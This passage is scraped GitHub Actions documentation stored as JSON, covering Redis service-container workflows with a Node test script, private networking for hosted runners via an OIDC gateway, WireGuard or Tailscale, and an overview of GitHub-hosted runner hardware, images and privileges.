        "content": "null [ { id: 1,\n    firstname: 'Mona the',\n    lastname: 'Octocat',\n    age: 9,\n    address:\n     '88 Colin P Kelly Jr St, San Francisco, CA 94107, United States',\n    email: 'octocat@github.com' } ]"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/creating-redis-service-containers",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you workflow examples that configure a service container using the Docker Hubredisimage. The workflow runs a script to create a Redis client and populate the client with data. To test that the workflow creates and populates the Redis client, the script prints the client's data to the console."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your workflows use Docker container actions, job containers, or service containers, then you must use a Linux runner:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If you are using GitHub-hosted runners, you must use an Ubuntu runner.",
          "If you are using self-hosted runners, you must use a Linux machine as your runner and Docker must be installed."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should be familiar with how service containers work with GitHub Actions and the networking differences between running jobs directly on the runner or in a container. For more information, seeAbout service containers."
      },
      {
        "type": "paragraph",
        "text": "You may also find it helpful to have a basic understanding of YAML, the syntax for GitHub Actions, and Redis. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Writing workflows",
          "Getting Started with Redisin the Redis documentation"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Running jobs in containers"
      },
      {
        "type": "paragraph",
        "text": "Configuring jobs to run in a container simplifies networking configurations between the job and the service containers. Docker containers on the same user-defined bridge network expose all ports to each other, so you don't need to map any of the service container ports to the Docker host. You can access the service container from the job container using the label you configure in the workflow."
      },
      {
        "type": "paragraph",
        "text": "You can copy this workflow file to the.github/workflowsdirectory of your repository and modify it as needed."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Redis container example\non: push\n\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:20-bookworm-slim\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: actions/checkout@v4\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to Redis\n        # Runs a script that creates a Redis client, populates\n        # the client with data, and retrieves data\n        run: node client.js\n        # Environment variable used by the `client.js` script to create a new Redis client.\n        env:\n          # The hostname used to communicate with the Redis service container\n          REDIS_HOST: redis\n          # The default Redis port\n          REDIS_PORT: 6379"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the container job"
      },
      {
        "type": "paragraph",
        "text": "This workflow configures a job that runs in thenode:20-bookworm-slimcontainer and uses theubuntu-latestGitHub-hosted runner as the Docker host for the container. For more information about thenode:20-bookworm-slimcontainer, see thenode imageon Docker Hub."
      },
      {
        "type": "paragraph",
        "text": "The workflow configures a service container with the labelredis. All services must run in a container, so each service requires that you specify the containerimage. This example uses therediscontainer image, and includes health check options to make sure the service is running. Append a tag to the image name to specify a version, e.g.redis:6. For more information, see theredis imageon Docker Hub."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:20-bookworm-slim\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the steps for the container job"
      },
      {
        "type": "paragraph",
        "text": "The workflow performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Checks out the repository on the runner",
          "Installs dependencies",
          "Runs a script to create a client"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: actions/checkout@v4\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to Redis\n    # Runs a script that creates a Redis client, populates\n    # the client with data, and retrieves data\n    run: node client.js\n    # Environment variable used by the `client.js` script to create a new Redis client.\n    env:\n      # The hostname used to communicate with the Redis service container\n      REDIS_HOST: redis\n      # The default Redis port\n      REDIS_PORT: 6379"
      },
      {
        "type": "paragraph",
        "text": "Theclient.jsscript looks for theREDIS_HOSTandREDIS_PORTenvironment variables to create the client. The workflow sets those two environment variables as part of the \"Connect to Redis\" step to make them available to theclient.jsscript. For more information about the script, seeTesting the Redis service container."
      },
      {
        "type": "paragraph",
        "text": "The hostname of the Redis service is the label you configured in your workflow, in this case,redis. Because Docker containers on the same user-defined bridge network open all ports by default, you'll be able to access the service container on the default Redis port 6379."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Running jobs directly on the runner machine"
      },
      {
        "type": "paragraph",
        "text": "When you run a job directly on the runner machine, you'll need to map the ports on the service container to ports on the Docker host. You can access service containers from the Docker host usinglocalhostand the Docker host port number."
      },
      {
        "type": "paragraph",
        "text": "You can copy this workflow file to the.github/workflowsdirectory of your repository and modify it as needed."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Redis runner example\non: push\n\njobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps port 6379 on service container to the host\n          - 6379:6379\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: actions/checkout@v4\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to Redis\n        # Runs a script that creates a Redis client, populates\n        # the client with data, and retrieves data\n        run: node client.js\n        # Environment variable used by the `client.js` script to create\n        # a new Redis client.\n        env:\n          # The hostname used to communicate with the Redis service container\n          REDIS_HOST: localhost\n          # The default Redis port\n          REDIS_PORT: 6379"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the runner job"
      },
      {
        "type": "paragraph",
        "text": "The example uses theubuntu-latestGitHub-hosted runner as the Docker host."
      },
      {
        "type": "paragraph",
        "text": "The workflow configures a service container with the labelredis. All services must run in a container, so each service requires that you specify the containerimage. This example uses therediscontainer image, and includes health check options to make sure the service is running. Append a tag to the image name to specify a version, e.g.redis:6. For more information, see theredis imageon Docker Hub."
      },
      {
        "type": "paragraph",
        "text": "The workflow maps port 6379 on the Redis service container to the Docker host. For more information about theportskeyword, seeAbout service containers."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps port 6379 on service container to the host\n          - 6379:6379"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the steps for the runner job"
      },
      {
        "type": "paragraph",
        "text": "The workflow performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Checks out the repository on the runner",
          "Installs dependencies",
          "Runs a script to create a client"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: actions/checkout@v4\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to Redis\n    # Runs a script that creates a Redis client, populates\n    # the client with data, and retrieves data\n    run: node client.js\n    # Environment variable used by the `client.js` script to create\n    # a new Redis client.\n    env:\n      # The hostname used to communicate with the Redis service container\n      REDIS_HOST: localhost\n      # The default Redis port\n      REDIS_PORT: 6379"
      },
      {
        "type": "paragraph",
        "text": "Theclient.jsscript looks for theREDIS_HOSTandREDIS_PORTenvironment variables to create the client. The workflow sets those two environment variables as part of the \"Connect to Redis\" step to make them available to theclient.jsscript. For more information about the script, seeTesting the Redis service container."
      },
      {
        "type": "paragraph",
        "text": "The hostname islocalhostor127.0.0.1."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing the Redis service container"
      },
      {
        "type": "paragraph",
        "text": "You can test your workflow using the following script, which creates a Redis client and populates the client with some placeholder data. The script then prints the values stored in the Redis client to the terminal. Your script can use any language you'd like, but this example uses Node.js and theredisnpm module. For more information, see thenpm redis module."
      },
      {
        "type": "paragraph",
        "text": "You can modifyclient.jsto include any Redis operations needed by your workflow. In this example, the script creates the Redis client instance, adds placeholder data, then retrieves the data."
      },
      {
        "type": "paragraph",
        "text": "Add a new file calledclient.jsto your repository with the following code."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "const redis = require(\"redis\");\n\n// Creates a new Redis client\n// If REDIS_HOST is not set, the default host is localhost\n// If REDIS_PORT is not set, the default port is 6379\nconst redisClient = redis.createClient({\n  url: `redis://${process.env.REDIS_HOST}:${process.env.REDIS_PORT}`\n});\n\nredisClient.on(\"error\", (err) => console.log(\"Error\", err));\n\n(async () => {\n  await redisClient.connect();\n\n  // Sets the key \"octocat\" to a value of \"Mona the octocat\"\n  const setKeyReply = await redisClient.set(\"octocat\", \"Mona the Octocat\");\n  console.log(\"Reply: \" + setKeyReply);\n  // Sets a key to \"species\", field to \"octocat\", and \"value\" to \"Cat and Octopus\"\n  const SetFieldOctocatReply = await redisClient.hSet(\"species\", \"octocat\", \"Cat and Octopus\");\n  console.log(\"Reply: \" + SetFieldOctocatReply);\n  // Sets a key to \"species\", field to \"dinotocat\", and \"value\" to \"Dinosaur and Octopus\"\n  const SetFieldDinotocatReply = await redisClient.hSet(\"species\", \"dinotocat\", \"Dinosaur and Octopus\");\n  console.log(\"Reply: \" + SetFieldDinotocatReply);\n  // Sets a key to \"species\", field to \"robotocat\", and \"value\" to \"Cat and Robot\"\n  const SetFieldRobotocatReply = await redisClient.hSet(\"species\", \"robotocat\", \"Cat and Robot\");\n  console.log(\"Reply: \" + SetFieldRobotocatReply);\n\n  try {\n    // Gets all fields in \"species\" key\n    const replies = await redisClient.hKeys(\"species\");\n    console.log(replies.length + \" replies:\");\n    replies.forEach((reply, i) => {\n        console.log(\"    \" + i + \": \" + reply);\n    });\n    await redisClient.quit();\n  }\n  catch (err) {\n    // statements to handle any exceptions\n  }\n})();"
      },
      {
        "type": "paragraph",
        "text": "The script creates a new Redis client using thecreateClientmethod, which accepts ahostandportparameter. The script uses theREDIS_HOSTandREDIS_PORTenvironment variables to set the client's IP address and port. Ifhostandportare not defined, the default host islocalhostand the default port is 6379."
      },
      {
        "type": "paragraph",
        "text": "The script uses thesetandhsetmethods to populate the database with some keys, fields, and values. To confirm that the Redis client contains the data, the script prints the contents of the database to the console log."
      },
      {
        "type": "paragraph",
        "text": "When you run this workflow, you should see the following output in the \"Connect to Redis\" step confirming you created the Redis client and added data:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Reply: OK\nReply: 1\nReply: 1\nReply: 1\n3 replies:\n    0: octocat\n    1: dinotocat\n    2: robotocat"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network/about-private-networking-with-github-hosted-runners",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About GitHub-hosted runners networking"
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub-hosted runners have access to the public internet. However, you may also want these runners to access resources on your private network, such as a package registry, a secret manager, or other on-premise services."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners are shared across all GitHub customers. However with private networking, you can configure hosted runners to be exclusively used to connect to your private network and resources while they are running your workflows."
      },
      {
        "type": "paragraph",
        "text": "There are a few different approaches you could take to configure this access, each with different advantages and disadvantages."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using an API Gateway with OIDC"
      },
      {
        "type": "paragraph",
        "text": "With GitHub Actions, you can use OpenID Connect (OIDC) tokens to authenticate your workflow outside of GitHub Actions. For more information, seeUsing an API gateway with OIDC."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using WireGuard to create a network overlay"
      },
      {
        "type": "paragraph",
        "text": "If you don't want to maintain separate infrastructure for an API Gateway, you can create an overlay network between your runner and a service in your private network, by running WireGuard in both places. For more information, seeUsing WireGuard to create a network overlay."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using an Azure Virtual Network (VNET)"
      },
      {
        "type": "paragraph",
        "text": "You can use GitHub-hosted runners in an Azure VNET. This enables you to use GitHub-managed infrastructure for CI/CD while providing you with full control over the networking policies of your runners. For more information about Azure VNET, seeWhat is Azure Virtual Network?in the Azure documentation."
      },
      {
        "type": "paragraph",
        "text": "Organization owners using the GitHub Team plan can configure Azure private networking for GitHub-hosted runners at the organization level. For more information, seeAbout Azure private networking for GitHub-hosted runners in your organization."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network/using-an-api-gateway-with-oidc",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Using an API gateway with OIDC"
      },
      {
        "type": "paragraph",
        "text": "With GitHub Actions, you can use OpenID Connect (OIDC) tokens to authenticate your workflow outside of GitHub Actions. For example, you could run an API gateway on the edge of your private network that authenticates incoming requests with the OIDC token and then makes API requests on behalf of your workflow in your private network."
      },
      {
        "type": "paragraph",
        "text": "The following diagram gives an overview of this solution's architecture:"
      },
      {
        "type": "paragraph",
        "text": "It's important that you verify not just that the OIDC token came from GitHub Actions, but that it came specifically from your expected workflows, so that other GitHub Actions users aren't able to access services in your private network. You can use OIDC claims to create these conditions. For more information, seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "paragraph",
        "text": "The main disadvantages of this approach are that you must implement the API gateway to make requests on your behalf, and you must run the gateway on the edge of your network."
      },
      {
        "type": "paragraph",
        "text": "The following advantages apply."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You don't need to configure any firewalls, or modify the routing of your private network.",
          "The API gateway is stateless and scales horizontally to handle high availability and high throughput."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information, seea reference implementation of an API Gatewayin the github/actions-oidc-gateway repository. This implementation requires customization for your use case and is not ready-to-run as-is). For more information, seeAbout security hardening with OpenID Connect."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network/using-wireguard-to-create-a-network-overlay",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Using WireGuard to create a network overlay"
      },
      {
        "type": "paragraph",
        "text": "If you don't want to maintain separate infrastructure for an API Gateway, you can create an overlay network between your runner and a service in your private network, by running WireGuard in both places."
      },
      {
        "type": "paragraph",
        "text": "There are various disadvantages to this approach:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To reach WireGuard running on your private service, you will need a well-known IP address and port that your workflow can reference: this can either be a public IP address and port, a port mapping on a network gateway, or a service that dynamically updates DNS.",
          "WireGuard doesn't handle NAT traversal out of the box, so you'll need to identify a way to provide this service.",
          "This connection is one-to-one, so if you need high availability or high throughput you'll need to build that on top of WireGuard.",
          "You'll need to generate and securely store keys for both the runner and your private service. WireGuard uses UDP, so your network must support UDP traffic."
        ]
      },
      {
        "type": "paragraph",
        "text": "There are some advantages too, as you can run WireGuard on an existing server so you don't have to maintain separate infrastructure, and it's well supported on GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Example: Configuring WireGuard"
      },
      {
        "type": "paragraph",
        "text": "This example workflow configures WireGuard to connect to a private service."
      },
      {
        "type": "paragraph",
        "text": "For this example, the WireGuard instance running in the private network has this configuration:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Overlay network IP address of192.168.1.1",
          "Public IP address and port of1.2.3.4:56789",
          "Public keyexamplepubkey1234..."
        ]
      },
      {
        "type": "paragraph",
        "text": "The WireGuard instance in the GitHub Actions runner has this configuration:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Overlay network IP address of192.168.1.2",
          "Private key stores as an GitHub Actions secret underWIREGUARD_PRIVATE_KEY"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: WireGuard example\n\non:\n  workflow_dispatch:\n\njobs:\n  wireguard_example:\n    runs-on: ubuntu-latest\n    steps:\n      - run: sudo apt install wireguard\n\n      - run: echo \"${{ secrets.WIREGUARD_PRIVATE_KEY }}\" > privatekey\n\n      - run: sudo ip link add dev wg0 type wireguard\n\n      - run: sudo ip address add dev wg0 192.168.1.2 peer 192.168.1.1\n\n      - run: sudo wg set wg0 listen-port 48123 private-key privatekey peer examplepubkey1234... allowed-ips 0.0.0.0/0 endpoint 1.2.3.4:56789\n\n      - run: sudo ip link set up dev wg0\n\n      - run: curl -vvv http://192.168.1.1"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeWireGuard's Quick Start, as well asUsing secrets in GitHub Actionsfor how to securely store keys."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using Tailscale to create a network overlay"
      },
      {
        "type": "paragraph",
        "text": "Tailscale is a commercial product built on top of WireGuard. This option is very similar to WireGuard, except Tailscale is more of a complete product experience instead of an open source component."
      },
      {
        "type": "paragraph",
        "text": "Its disadvantages are similar to WireGuard: The connection is one-to-one, so you might need to do additional work for high availability or high throughput. You still need to generate and securely store keys. The protocol is still UDP, so your network must support UDP traffic."
      },
      {
        "type": "paragraph",
        "text": "However, there are some advantages over WireGuard: NAT traversal is built-in, so you don't need to expose a port to the public internet. It is by far the quickest of these options to get up and running, since Tailscale provides an GitHub Actions workflow with a single step to connect to the overlay network."
      },
      {
        "type": "paragraph",
        "text": "For more information, see theTailscale GitHub Action, as well asUsing secrets in GitHub Actionsfor how to securely store keys."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/using-github-hosted-runners/using-github-hosted-runners/about-github-hosted-runners",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview of GitHub-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "Runners are the machines that execute jobs in a GitHub Actions workflow. For example, a runner can clone your repository locally, install testing software, and then run commands that evaluate your code."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides runners that you can use to run your jobs, or you canhost your own runners. Each GitHub-hosted runner is a new virtual machine (VM) hosted by GitHub with the runner application and other tools preinstalled, and is available with Ubuntu Linux, Windows, or macOS operating systems. When you use a GitHub-hosted runner, machine maintenance and upgrades are taken care of for you."
      },
      {
        "type": "paragraph",
        "text": "You can choose one of the standard GitHub-hosted runner options or, if you are on the GitHub Team or GitHub Enterprise Cloud plan, you can provision a runner with more cores, or a runner that's powered by a GPU processor. These machines are referred to as \"larger runner.\" For more information, seeAbout larger runners."
      },
      {
        "type": "paragraph",
        "text": "Using GitHub-hosted runners requires network access with at least 70 kilobits per second upload and download speeds."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a GitHub-hosted runner"
      },
      {
        "type": "paragraph",
        "text": "To use a GitHub-hosted runner, create a job and useruns-onto specify the type of runner that will process the job, such asubuntu-latest,windows-latest, ormacos-latest. For the full list of runner types, seeAbout GitHub-hosted runners. If you haverepo: writeaccess to a repository, you can view a list of the runners available to use in workflows in the repository. For more information, seeViewing available runners for a repository."
      },
      {
        "type": "paragraph",
        "text": "When the job begins, GitHub automatically provisions a new VM for that job. All steps in the job execute on the VM, allowing the steps in that job to share information using the runner's filesystem. You can run workflows directly on the VM or in a Docker container. When the job has finished, the VM is automatically decommissioned."
      },
      {
        "type": "paragraph",
        "text": "The following diagram demonstrates how two jobs in a workflow are executed on two different GitHub-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow has two jobs, namedRun-npm-on-UbuntuandRun-PSScriptAnalyzer-on-Windows. When this workflow is triggered, GitHub provisions a new virtual machine for each job."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The job namedRun-npm-on-Ubuntuis executed on a Linux VM, because the job'sruns-on:specifiesubuntu-latest.",
          "The job namedRun-PSScriptAnalyzer-on-Windowsis executed on a Windows VM, because the job'sruns-on:specifieswindows-latest."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Run commands on different operating systems\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  Run-npm-on-Ubuntu:\n    name: Run npm on Ubuntu\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm help\n\n  Run-PSScriptAnalyzer-on-Windows:\n    name: Run PSScriptAnalyzer on Windows\n    runs-on: windows-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Install PSScriptAnalyzer module\n        shell: pwsh\n        run: |\n          Set-PSRepository PSGallery -InstallationPolicy Trusted\n          Install-Module PSScriptAnalyzer -ErrorAction Stop\n      - name: Get list of rules\n        shell: pwsh\n        run: |\n          Get-ScriptAnalyzerRule"
      },
      {
        "type": "paragraph",
        "text": "While the job runs, the logs and output can be viewed in the GitHub UI:"
      },
      {
        "type": "paragraph",
        "text": "The GitHub Actions runner application is open source. You can contribute and file issues in therunnerrepository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing available runners for a repository"
      },
      {
        "type": "paragraph",
        "text": "If you haverepo: writeaccess to a repository, you can view a list of the runners available to the repository."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, under the \"Management\" section, clickRunners.",
          "Review the list of available GitHub-hosted runners for the repository.",
          "Optionally, to copy a runner's label to use it in a workflow, clickto the right of the runner, then clickCopy label."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Enterprise and organization owners can create runners from this page. To create a new runner, clickNew runnerat the top right of the list of runners to add runners to the repository."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeManaging larger runnersandAdding self-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Supported runners and hardware resources"
      },
      {
        "type": "paragraph",
        "text": "Ranges of GitHub-hosted runners are available for use in public and private repositories."
      },
      {
        "type": "paragraph",
        "text": "For lists of available runners, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Standard runners forpublicrepositories",
          "Standard runners forprivaterepositories"
        ]
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted Linux runners support hardware acceleration for Android SDK tools, which makes running Android tests much faster and consumes fewer minutes. For more information on Android hardware acceleration, seeConfigure hardware acceleration for the Android Emulatorin the Android Developers documentation."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The-latestrunner images are the latest stable images that GitHub provides, and might not be the most recent version of the operating system available from the operating system vendor."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Beta and Deprecated Images are provided \"as-is\", \"with all faults\" and \"as available\" and are excluded from the service level agreement and warranty. Beta Images may not be covered by customer support."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Standard GitHub-hosted runners for public repositories"
      },
      {
        "type": "paragraph",
        "text": "For public repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. The use of these runners on public repositories is free and unlimited."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The arm64 Linux and Windows runners are in public preview and subject to change."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Standard GitHub-hosted runners for  private repositories"
      },
      {
        "type": "paragraph",
        "text": "For  private repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. These runners use your GitHub account's allotment of free minutes, and are then charged at the per minute rates. For more information, seeAbout billing for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Workflow logs list the runner used to run a job. For more information, seeViewing workflow run history."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limitations for arm64 macOS runners"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "All actions provided by GitHub are compatible with arm64 GitHub-hosted runners. However, community actions may not be compatible with arm64 and need to be manually installed at runtime.",
          "Nested-virtualization and Metal Performance Shaders (MPS) are not supported due to the limitation of Apple's Virtualization Framework.",
          "Networking capabilities such as Azure private networking and assigning static IPs are not currently available for macOS larger runners.",
          "The arm64 macOS runners do not have a static UUID/UDID assigned to them because Apple does not support this feature. However, Intel MacOS runners are assigned a static UDID, specifically4203018E-580F-C1B5-9525-B745CECA79EB. If you are building and signing on the same host you plan to test the build on, you can sign with adevelopment provisioning profile. If you do require a static UDID, you can use Intel runners and add their UDID to your Apple Developer account."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Larger runners"
      },
      {
        "type": "paragraph",
        "text": "Customers on GitHub Team and GitHub Enterprise Cloud plans can choose from a range of managed virtual machines that have more resources than thestandard GitHub-hosted runners. These machines are referred to as \"larger runner.\" They offer the following advanced features:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "More RAM, CPU, and disk space",
          "Static IP addresses",
          "Azure private networking",
          "The ability to group runners",
          "Autoscaling to support concurrent workflows",
          "GPU-powered runners"
        ]
      },
      {
        "type": "paragraph",
        "text": "These larger runners are hosted by GitHub and have the runner application and other tools preinstalled."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUsing larger runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Runner Images"
      },
      {
        "type": "paragraph",
        "text": "GitHub maintains our own set of VM images for our standard hosted runners. This includes the images for macOS, x64 linux and Windows images. The list of images and their included tools are managed in theactions/runner-imagesrepository. Our arm64 images are partner images, and those are managed in theactions/partner-runner-imagesrepository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Preinstalled software for GitHub-owned images"
      },
      {
        "type": "paragraph",
        "text": "The software tools included in our GitHub-owned images are updated weekly. The update process takes several days, and the list of preinstalled software on themainbranch is updated after the whole deployment ends."
      },
      {
        "type": "paragraph",
        "text": "Workflow logs include a link to the preinstalled tools on the exact runner. To find this information in the workflow log, expand theSet up jobsection. Under that section, expand theRunner Imagesection. The link followingIncluded Softwarewill describe the preinstalled tools on the runner that ran the workflow."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeViewing workflow run history."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners include the operating system's default built-in tools, in addition to the packages listed in the above references. For example, Ubuntu and macOS runners includegrep,find, andwhich, among other default tools."
      },
      {
        "type": "paragraph",
        "text": "You can also view a software bill of materials (SBOM) for each build of the Windows and Ubuntu runner images. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using preinstalled software"
      },
      {
        "type": "paragraph",
        "text": "We recommend using actions to interact with the software installed on runners. This approach has several benefits:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Usually, actions provide more flexible functionality like version selection, ability to pass arguments, and parameters",
          "It ensures the tool versions used in your workflow will remain the same regardless of software updates"
        ]
      },
      {
        "type": "paragraph",
        "text": "If there is a tool that you'd like to request, please open an issue atactions/runner-images. This repository also contains announcements about all major software updates on runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Installing additional software"
      },
      {
        "type": "paragraph",
        "text": "You can install additional software on GitHub-hosted runners. For more information, seeCustomizing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Cloud hosts used by GitHub-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "GitHub hosts Linux and Windows runners on virtual machines in Microsoft Azure with the GitHub Actions runner application installed. The GitHub-hosted runner application is a fork of the Azure Pipelines Agent. Inbound ICMP packets are blocked for all Azure virtual machines, so ping or traceroute commands might not work. GitHub hosts macOS runners in Azure data centers."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Workflow continuity"
      },
      {
        "type": "paragraph",
        "text": "If GitHub Actions services are temporarily unavailable, then a workflow run is discarded if it has not been queued within 30 minutes of being triggered. For example, if a workflow is triggered and the GitHub Actions services are unavailable for 31 minutes or longer, then the workflow run will not be processed."
      },
      {
        "type": "paragraph",
        "text": "In addition, if the workflow run has been successfully queued, but has not been processed by a GitHub-hosted runner within 45 minutes, then the queued workflow run is discarded."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Administrative privileges"
      },
      {
        "type": "paragraph",
        "text": "The Linux and macOS virtual machines both run using passwordlesssudo. When you need to execute commands or install tools that require more privileges than the current user, you can usesudowithout needing to provide a password. For more information, see theSudo Manual."
      },
      {
        "type": "paragraph",
        "text": "Windows virtual machines are configured to run as administrators with User Account Control (UAC) disabled. For more information, seeHow User Account Control worksin the Windows documentation."
      },
